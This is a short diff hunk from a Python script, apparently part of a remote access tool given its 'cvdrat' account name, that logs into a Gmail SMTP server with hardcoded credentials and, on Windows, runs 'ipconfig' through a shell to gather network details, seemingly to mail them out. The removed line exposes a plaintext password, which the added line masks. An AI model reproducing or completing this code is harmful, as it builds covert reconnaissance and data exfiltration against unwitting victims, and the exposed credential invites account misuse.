@@ -2,7 +2,7 @@ import smtplib
 import platform
 
 server = smtplib.SMTP('smtp.gmail.com', 587)
-server.login("cvdrat@gmail.com", "rat123rat123")
+server.login("cvdrat@gmail.com", "**********")
 
 if platform.system().lower() == 'windows':
 	cmd = subprocess.Popen("ipconfig",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
